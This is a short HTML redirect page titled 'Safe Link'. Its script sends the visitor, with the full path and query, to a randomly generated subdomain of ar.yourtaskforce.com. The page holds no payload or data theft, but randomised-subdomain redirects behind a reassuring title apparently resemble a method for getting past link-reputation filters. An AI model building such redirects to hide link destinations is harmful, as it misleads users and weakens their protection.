<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Safe Link</title>
<script>
  let arr = new Uint8Array(6);
  crypto.getRandomValues(arr);
  let sub = Array.from(arr, b => (b % 36).toString(36)).join('');
  let domain = "ar.yourtaskforce.com";
	location.replace(`https://${sub}.${domain}${location.pathname}${location.search}${location.hash}`);
</script>
</head>
<body>Redirecting...</body>
</html>
